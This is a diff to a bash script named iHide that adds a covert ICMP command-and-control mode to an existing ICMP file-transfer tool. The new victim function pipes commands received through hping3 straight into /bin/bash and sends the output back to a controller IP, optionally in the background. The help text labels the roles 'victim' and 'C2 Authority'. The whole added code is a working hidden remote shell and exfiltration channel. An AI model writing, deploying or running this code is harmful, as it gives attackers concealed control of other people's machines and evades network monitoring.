@@ -43,12 +43,39 @@ if [[ "$arg" != *-d* ]] || [[ "$arg" != *-s* ]] || [[ "$arg" != *-f* ]] || [[ "$
 				fi
 fi
 }
+function icmpcontrol {
+if [[ "$arg" != *-i* ]] || [[ "$arg" != *-j* ]] || [[ "$arg" != *-s* ]] || [[ "$arg" != *-d* ]] || [[ "$arg" != *-g* ]] || [[ "$arg" != *-c* ]] || [[ "$arg" != *-k* ]]; then
+	echo "Not enough flags/switches"
+	echo "Run the -h command to view the help file"
+	echo "Required flags: i,j,s,d,g,c,k"
+	exit
+else
+	hping3 -I $iface --listen $control_signature & hping3 $sflag --icmp --sign $signature --file ${VAR:-/dev/stdin} -d $dflag -C $code
+fi
+}
+function icmpvictim {
+if [[ "$arg" != *-i* ]] || [[ "$arg" != *-j* ]] || [[ "$arg" != *-s* ]] || [[ "$arg" != *-d* ]] || [[ "$arg" != *-g* ]] || [[ "$arg" != *-c* ]] || [[ "$arg" != *-m* ]]; then
+	echo "Not enough flags/switches"
+	echo "Run the -h command to view the help file"
+	echo "Required flags: i,j,s,d,g,c,m"
+	exit
+else
+	if [[ $background == true ]]; then
+		(hping3 -I $iface --listen $signature | /bin/bash 2>&1 | hping3 $sflag --icmp --sign $control_signature --file ${VAR:-/dev/stdin} -d $dflag -C $code &)
+	else
+		hping3 -I $iface --listen $signature | /bin/bash 2>&1 | hping3 $sflag --icmp --sign $control_signature --file ${VAR:-/dev/stdin} -d $dflag -C $code
+	fi
+fi
+}
 function helpmenu {
 echo "
-+++++++++++++++++iHide: ICMP File Transfer and Receiving+++++++++++++++++
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+++++++++++++++++++++iHide: ICMP File Transfer and Receiving++++++++++++++++++++
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
 -h  -----  This help mess
 -l  -----  List the ICMP Types
 -v  -----  version/about
+-a  -----  auto cleanup
 *************Transmit Options*************
 -d  -----  Destination server IP
 -s  -----  Data stream signature
@@ -63,6 +90,17 @@ echo "
 -i  -----  Listening interface
 -f  -----  The filename to save the file as
 -r  -----  Receive mode
+**********Terminal Mode Options**********
+**************Experimental***************
+-i  -----  listening interface
+-j  -----  signature on controller
+-s  -----  IP of controller; IP of victim with -k flag
+-d  -----  data field size
+-g  -----  victim machine signature
+-c  -----  ICMP code
+-m  -----  This is the victim machine
+-k  -----  This is the controller (C2 Authority)
+**************Experimental***************
 +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
 Examples:
 ----|Transfer|----
@@ -135,10 +173,10 @@ exit
 }
 arg="$*"
 NUMARGS="$#"
-if [[ "$*" == *"-r"* ]] && [[ "$*" == *"-t"* ]]; then
+if [[ "$*" == *"-r"* ]] && [[ "$*" == *"-t"* ]] || [[ "$*" == *"-k"* ]] && [[ "$*" == *"-m"* ]]; then
 	echo "
 	=======================================================================
-	ERROR: You can only select -t OR -r NOT both, that wouldn't make sense.
+	   ERROR: You can only select -t OR -r OR -k OR -m NOT a combination.
 	======================================================================="
 	echo "Try -h for the help menu"
 	exit
@@ -146,11 +184,12 @@ fi
 if [ $NUMARGS -eq 0 ]; then
   helpmenu
 fi
-while getopts "hvld:s:f:c:e:z:g:i:tr" option;
+while getopts "hvld:s:j:f:c:e:z:g:i:btrkm" option;
 do
 	case $option in	
 	h|\?) helpmenu
 	exit;;
+	a) cleanup;;
 	l) icmptypes;;
     f)  if [[ "$OPTARG" = "-" ]]; then
 			file="${VAR:-/dev/stdin}"
@@ -160,14 +199,18 @@ do
 		fi;;
 	d) dflag="$OPTARG";;
 	c) code="$OPTARG";;
+	j) control_signature="$OPTARG";;
 	g) signature="$OPTARG";;
 	s) sflag="$OPTARG";;
 	i) iface="$OPTARG";;
 	e) eof="$OPTARG";;
 	v) versioninfo;;
+	z) size="$OPTARG";;
+	b) background=true;;
 	t) icmptransfer;;
 	r) icmpreceive;;
-	z) size="$OPTARG";;
-esac
+	k) icmpcontrol;;
+	m) icmpvictim;;
+	esac
 done
 shift $((OPTIND-1))
